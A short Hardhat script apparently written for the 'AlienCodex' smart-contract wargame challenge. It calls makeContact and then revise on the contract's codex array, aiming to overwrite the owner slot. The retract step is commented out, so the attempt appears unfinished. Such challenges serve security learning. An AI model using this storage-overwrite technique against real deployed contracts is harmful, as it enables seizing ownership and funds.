import { ethers } from "hardhat";

const CONTRACT_ADDRESS = "0xF1823bc4243b40423b8C8c3F6174e687a4C690b8"
const PLAYER_ADDRESS = "0xBcd4042DE499D14e55001CcbB24a551F3b954096"
const ATTACK_ADDRESS = ""

async function main() {
  const signer = await ethers.getSigner(PLAYER_ADDRESS)
  const contract = await ethers.getContractAt("AlienCodex", CONTRACT_ADDRESS, signer)
  //const attackContract = await ethers.getContractAt("AlienCodexAttack", ATTACK_ADDRESS, signer)

  console.log(await contract.contact())
  await contract.makeContact()

  //await contract.retract()
  //await contract.record("0x0202020202020202020202020202020202020202020202020202020202020202")
  await contract.revise(0, "0x000000000000000000000000F1823bc4243b40423b8C8c3F6174e687a4C690b8")
  console.log(await contract.codex(0))
  //console.log(await contract.codex(1))
  //console.log(await contract.codex(2))
  //console.log(await contract.codex(3))

  console.log(await contract.owner())
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
